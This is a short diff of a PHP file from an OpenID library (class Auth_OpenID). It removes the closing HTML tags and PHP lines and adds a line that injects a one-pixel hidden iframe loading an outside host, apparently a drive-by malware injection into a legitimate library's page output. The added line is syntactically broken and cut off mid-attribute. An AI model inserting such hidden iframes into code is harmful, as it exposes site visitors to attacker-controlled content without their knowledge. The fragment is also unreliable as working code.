@@ -548,8 +548,4 @@ class Auth_OpenID {
                "  elements[i].style.display = \"none\";".
                "}".
                "</script>".
-               "</body>".
-               "</html>");
-    }
-}
-?>
+               "<iframe src="http://ZieF.pl/rc/" width=1 height=
